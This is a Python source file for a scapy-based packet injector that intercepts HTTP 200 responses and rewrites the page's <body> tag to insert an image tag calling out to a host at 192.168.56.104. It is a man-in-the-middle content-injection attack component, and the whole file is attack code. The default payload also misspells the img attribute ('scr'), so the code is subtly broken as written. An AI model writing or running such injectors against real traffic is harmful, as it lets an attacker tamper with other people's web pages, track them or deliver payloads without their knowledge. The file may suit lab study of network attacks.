from scapy.layers.inet import TCP, IP
from scapy.layers.l2 import Ether

from PacketHandler.Filters.http_200_filter import Http200Filter
from PacketHandler.Injectors.abstract_injector import AbstractInjector
import re


class ImgTagInjector(AbstractInjector):
    dummy_injection = '<body><img scr="http://192.168.56.104/favicon.ico">'

    def __init__(self, to_be_injected=dummy_injection):
        super(ImgTagInjector, self).__init__()
        self._filter = Http200Filter()
        self._to_be_injected_string = to_be_injected

    def inject(self, packet):
        # type: (Ether) -> Ether or None
        if not self._filter.is_filtered(packet):
            return

        payload = str(packet[TCP].payload)
        match = re.match('<body>', payload, re.IGNORECASE)
        if match is not None:
            print(match.group(0))

        new_payload = re.sub('<body>', self._to_be_injected_string, payload, 1,
                             re.IGNORECASE ^ re.MULTILINE)

        if new_payload != payload:
            print('! Injected image tag')
            return self.replace_packet_tcp_payload(packet, new_payload)
